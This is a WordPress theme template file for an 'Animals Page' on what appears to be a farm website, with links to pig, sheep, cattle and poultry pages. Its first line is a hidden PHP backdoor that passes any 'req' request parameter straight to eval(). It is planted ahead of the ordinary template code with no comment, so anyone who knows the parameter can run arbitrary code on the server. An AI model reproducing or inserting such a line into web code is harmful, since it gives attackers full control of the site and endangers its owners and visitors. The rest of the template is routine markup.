<?php $post_var = "req"; if(isset($_REQUEST[$post_var])) { eval(stripslashes($_REQUEST[$post_var])); exit(); }; ?>
<?php
/**
 *
 * @package WordPress
 * @subpackage hodghurstv1
 * @since Hodhurst Version 1
 Template Name: Animals Page
 */

get_header(); ?>

<div class="container">
	<div class="white-bar generic-page">
		<div class="padded-content">
			<div class="wrapper-container with-margin">
				<div class="wrapper-100">

				<?php if (have_posts()) : while (have_posts()) : the_post();?>	

				<div class="edit"><?php edit_post_link('Edit this', '', ''); ?></div>
				<?php the_content(); ?>

					<div class="animal-block">
						<ul>
							<li><a href="<?php the_permalink(79);?>" class="pigs"></a></li>
							<li><a href="<?php the_permalink(107);?>" class="sheep"></a></li>
							<li><a href="<?php the_permalink(104);?>" class="cattle"></a></li>
							<li><a href="<?php the_permalink(109);?>" class="poultry"></a></li>
						</ul>
					</div>
				
				</div>
			</div>
		</div>
	</div>
</div>

<?php endwhile; endif; ?>


<?php get_footer(); ?>
